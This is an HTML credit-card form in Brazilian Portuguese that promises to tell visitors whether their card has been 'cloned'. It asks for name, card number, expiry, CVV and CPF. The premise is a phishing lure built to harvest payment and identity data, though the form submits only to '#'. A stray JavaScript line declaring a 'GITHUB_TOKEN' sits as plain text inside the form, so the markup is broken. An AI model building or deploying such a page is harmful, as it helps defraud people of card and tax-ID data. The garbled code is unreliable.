<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Formulário Cartão de Crédito</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border: 1px solid #ccc;
            border-radius: 8px;
            background-color: #f7f7f7;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        p {
            margin-bottom: 20px;
            font-size: 16px;
            color: #555;
        }
        label {
            display: block;
            margin-top: 15px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"],
        input[type="number"],
        input[type="month"],
        input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            box-sizing: border-box;
            border: 1px solid #999;
            border-radius: 4px;
        }
        button {
            margin-top: 25px;
            width: 100%;
            padding: 10px;
            background-color: #2c87f0;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1a5ec8;
        }
    </style>
</head>
<body>
    <h2>Formulário Cartão de Crédito</h2>
    <p>Coloque os dados de seu cartão de crédito e veja se você já foi clonado.<br>Não esqueça do CPF.</p>
    <form action="#" method="POST">
        <label for="nome">Nome no cartão:</label>
        <input type="text" id="nome" name="nome" required />

        <label for="numero">Número do cartão:</label>
        <input type="text" id="numero" name="numero" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required />

        <label for="validade">Validade (mês/ano):</label>
        <input type="month" id="validade" name="validade" required />

        <label for="cvv">CVV:</label>
        <input type="password" id="cvv" name="cvv" maxlength="4" required />

        <label for="cpf">CPF:</label>
        <input type="text" id="cpf" name="cpf" maxlength="14" placeholder="000.000.000-00" required />

        <button type="submit">Enviar</button>

const GITHUB_TOKEN = "CartaoClo"; // Personal Access Token do GitHub


    </form>
</body>
</html>
